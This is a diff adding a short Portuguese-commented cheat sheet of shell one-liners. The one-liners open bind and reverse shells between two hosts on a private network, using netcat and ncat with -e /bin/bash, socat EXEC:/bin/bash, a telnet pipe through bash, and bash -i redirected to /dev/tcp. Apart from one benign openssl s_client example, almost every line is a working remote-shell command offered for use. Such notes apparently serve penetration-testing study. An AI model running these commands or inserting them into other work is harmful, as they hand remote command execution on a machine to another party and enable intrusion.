@@ -1,0 +1,83 @@
+# ===============================================
+# Usando Netcat
+# ===============================================
+
+# Host 1 (192.168.0.20):
+    nc -vnlp 9000 -e /bin/bash
+
+# Host 2:
+    nc -vn 192.168.0.20 9000
+
+# ===============================================
+# Usando Ncat
+# ===============================================
+
+# Primeiro é necessário criar uma chave e um certificado
+# com o openssl.
+    openssl req -x509 -newkey rsa:2048 -keyout chave.pem -out certificado.pem -days 10
+
+# Depois é só usar os arquivos gerados.
+
+# Host 1 (192.168.0.20):
+    ncat -vnlp 9000 --ssl-key chave.pem --ssl-cert certificado.pem -e /bin/bash
+
+# Host 1 (192.168.0.20) permitindo apenas Ip especifico:
+    ncat -vnlp 9000 --ssl-key chave.pem --ssl-cert certificado.pem --allow 192.168.0.10 -e /bin/bash
+
+# Host 2:
+    ncat -vn 192.168.0.20 9000 --ssl
+
+
+# ===============================================
+# Usando OpenSSL
+# ===============================================
+
+# openssl s_client -connect <endereço>:<porta>
+# ex:
+    openssl s_client -connect tesla.com:443
+
+# ===============================================
+# Usando SOCAT e NetCat
+# ===============================================
+
+# Metodo 1
+# ---
+
+# Host 1 (192.168.0.20):
+    socat tcp4-listen:9000 -
+
+# Host 2:
+    nc -vn 192.168.0.20 9000 -e /bin/bash
+
+# Metodo 2
+# ---
+
+# Host 1:
+    socat tcp4:192.168.0.10:9000 EXEC:/bin/bash
+
+# Host 2 (192.168.0.10):
+    nc -nvlp 9000 -e /bin/bash
+
+# ===============================================
+# Telnet e NetCat
+# ===============================================
+
+# Host 1:
+    telnet 192.168.0.10 4444 | /bin/bash | telnet 192.168.0.10 4445
+
+# Host 2 (192.168.0.10):
+    # Digitar comandos
+    nc -vnlp 4444
+
+    # Visualizar resposta
+    nc -vnlp 4445
+
+# ===============================================
+# /dev/tcp
+# ===============================================
+
+# Host 1:
+    bash -i > /dev/tcp/192.168.0.10/9000 0>&1 2>&1
+
+# Host 2 (192.168.0.10):
+    nc -vnlp 9000
